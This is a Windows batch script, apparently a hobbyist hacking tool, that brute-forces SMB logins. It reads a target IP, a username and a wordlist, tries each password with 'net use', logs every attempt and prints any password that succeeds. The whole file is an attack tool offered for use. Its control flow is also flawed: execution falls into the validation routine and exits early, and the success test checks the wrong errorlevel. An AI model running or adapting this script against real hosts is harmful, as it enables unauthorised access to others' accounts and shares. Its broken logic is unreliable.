@echo off
title SMB Bruteforce - by Lira
color A
echo.
setlocal enabledelayedexpansion

:validate_ip
set "ip=%~1"
for /f "tokens=1-4 delims=." %%a in ("%ip%") do (
    if %%a lss 0 set valid_ip=0
    if %%a gtr 255 set valid_ip=0
    if %%b lss 0 set valid_ip=0
    if %%b gtr 255 set valid_ip=0
    if %%c lss 0 set valid_ip=0
    if %%c gtr 255 set valid_ip=0
    if %%d lss 0 set valid_ip=0
    if %%d gtr 255 set valid_ip=0
)
if defined valid_ip (
    echo Invalid IP address. Please enter a valid IP address.
    exit /b 1
)
goto :eof

:input
set /p ip="Enter IP Address: "
call :validate_ip %ip%
set /p user="Enter Username: "
set /p wordlist="Enter Password List (with full path): "
if not exist "%wordlist%" (
    echo Password list file not found. Please enter a valid file path.
    exit /b 1
)

setlocal enabledelayedexpansion
for /f %%a in ('find /c /v "" ^<"%wordlist%"') do set total=%%a
set /a progress=0

set log="bruteforce_log.txt"
echo SMB Bruteforce Log > %log%
echo Target IP: %ip% >> %log%
echo Username: %user% >> %log%
echo Wordlist: %wordlist% >> %log%
echo. >> %log%

set /a count=1
for /f "usebackq tokens=*" %%a in ("%wordlist%") do (
    set "pass=%%a"
    call :attempt
    set /a progress+=1
    set /a percent=(progress*100)/total
    <nul set /p "=Progress: !percent!%% [!progress! / !total! attempts]" 
    echo.
)
echo Password not Found :(
echo Password not Found :( >> %log%
pause
exit

:success
echo.
echo Password Found! !pass!
echo Password Found! !pass! >> %log%
net use \\%ip% /d /y >nul 2>&1
pause
exit

:attempt
net use \\%ip% /user:%user% "!pass!" >nul 2>&1
echo [ATTEMPT !count!] [!pass!]
echo [ATTEMPT !count!] [!pass!] >> %log%
set /a count+=1
if !errorlevel! EQU 0 goto success
goto :eof